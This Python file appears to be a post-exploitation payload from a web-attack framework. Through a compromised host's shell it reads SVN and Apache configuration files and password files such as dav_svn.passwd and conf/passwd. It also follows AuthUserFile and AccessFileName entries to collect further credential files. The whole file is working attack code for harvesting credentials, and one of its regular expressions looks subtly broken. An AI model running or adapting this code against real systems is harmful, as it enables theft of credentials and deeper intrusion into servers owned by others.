import re
import core.data.kb.knowledgeBase as kb
from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class svn_config_files(base_payload):
    '''
    This payload shows SVN Server configuration files
    '''
    def api_read(self, parameters):
        self.result = {}
        files = []

        def parse_parent_path(config):
            parent_path = re.findall('^(?<=SVNParentPath )(.*)', config, re.MULTILINE)
            if parent_path:
                return parent_path
            else:
                return []
        
        def parse_path(config):
            path = re.findall('(?<=^SVNPath )(.*)', config, re.MULTILINE)
            if path:
                return path
            else:
                return []
        
        def parse_auth_files(config):
            auth = re.findall('(?<=AuthUserFile )(.*)', config, re.MULTILINE)
            auth2 = re.findall('(?<=AccessFileName )(.*)', config, re.MULTILINE)
            if auth and auth2:
                return auth+auth2
            if auth:
                return auth
            if auth2:
                return auth2
            else:
                return []
        
        def multi_parser(self, file, file_content, only_parse=False):
            parent_path = parse_parent_path(file_content)
            if parent_path:
                for file_parsed in parent_path:
                    parent_path_content = self.shell.read(file_parsed)
                    if parent_path_content:
                        self.result[ file_parsed ] = parent_path_content
                    
            path = parse_path(file_content)
            if path:
                for file_parsed in path:
                    path_content = self.shell.read(file_parsed)
                    if path_content:
                        self.result[ file_parsed ] = path_content
                    
            auth = parse_auth_files(file_content)
            if auth:
                for file_parsed in auth:
                    auth_content = self.shell.read(file_parsed)
                    if auth_content:
                        self.result[ file_parsed ] = auth_content
            if not only_parse:
                self.result[ file ] = file_content

        files.append('/etc/httpd/conf.d/subversion.conf')
        files.append('/etc/httpd/conf.d/viewvc.conf')
        files.append('/etc/viewvc/viewvc.conf')
        files.append('/opt/viewvc/viewvc.conf')
        files.append('/etc/httpd/conf.d/statsvn.conf')
        files.append('/srv/trac/projectX/conf/trac.ini')
        files.append('/etc/apache2/conf.d/subversion.conf')
        files.append('/etc/apache2/dav_svn.passwd')
        files.append('/etc/apache2/dav_svn.password')
        files.append('/etc/apache2/httpd.conf')
        files.append('/etc/apache2/svn.conf')
        files.append('/etc/subversion/conf/svnserve.conf')
        files.append('/usr/local/subversion/conf/httpd.conf')
        files.append('/etc/sasl/subversion.conf')
        files.append('/var/local/svn/conf/svnserve.conf')
        files.append('/srv/svn/repositories/svntest/conf/svnserve.conf')
        files.append('/var/svn/conf/commit-access-control.cfg')
        files.append('/etc/subversion/hairstyles')
        files.append('/etc/subversion/servers')
        files.append('/etc/subversion/config')

        users_info = self.exec_payload('users')
        
        for user in users_info:
            directory = users_info[user]['home']

            files.append(directory+'.subversion/config')
            files.append(directory+'.subversion/config_backup')
            files.append(directory+'.subversion/servers')
            files.append(directory+'.subversion/hairstyles')

        apache_config_directory = self.exec_payload('apache_config_directory')['apache_directory']
        for directory in apache_config_directory:
            dav_conf_file_content = self.shell.read(directory+'mods-enabled/dav_svn.conf')
            if dav_conf_file_content:
                multi_parser(self, directory+'mods-enabled/dav_svn.conf', dav_conf_file_content)

        apache_config_files= self.exec_payload('apache_config_files')['apache_config']
        for file, file_content in apache_config_files.iteritems():
            if file_content:
                multi_parser(self, file, file_content, True)
    
        if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
            users_info = self.exec_payload('users')
            
            for user in users_info:
                home = users_info[user]['home']

                for dirname in kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                    file_content = self.shell.read(home+dirname.lower()+'/conf/svnserve.conf')
                    passwd_content = self.shell.read(home+dirname.lower()+'/conf/passwd')
                    if file_content:
                        multi_parser(self, home+dirname.lower()+'/conf/svnserve.conf', file_content)
                    if passwd_content:
                        multi_parser(self, home+dirname.lower()+'/conf/passwd', passwd_content)

        
        if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
            for folder in kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                file_content = self.shell.read('/srv/svn/'+folder.lower()+'/conf/svnserve.conf')
                passwd_content = self.shell.read('/srv/svn/'+folder.lower()+'/conf/passwd')
                if file_content:
                    multi_parser(self, '/srv/svn/'+folder.lower()+'/conf/svnserve.conf', file_content)
                if passwd_content:
                    multi_parser(self, '/srv/svn/'+folder.lower()+'/conf/passwd', passwd_content)

        for file in files:
            file_content = self.shell.read(file)
            if file_content:
                multi_parser(self, file, file_content)

        return self.result

    def run_read(self, parameters):
        api_result = self.api_read( parameters )
        
        if not api_result:
            return 'SVN configuration files not found.'
        else:
            rows = []
            rows.append( ['SVN configuration files'] ) 
            rows.append( [] )
            
            for filename in api_result:
                rows.append( [filename,] )
                
            result_table = table( rows )
            result_table.draw( 80 )                    
            return

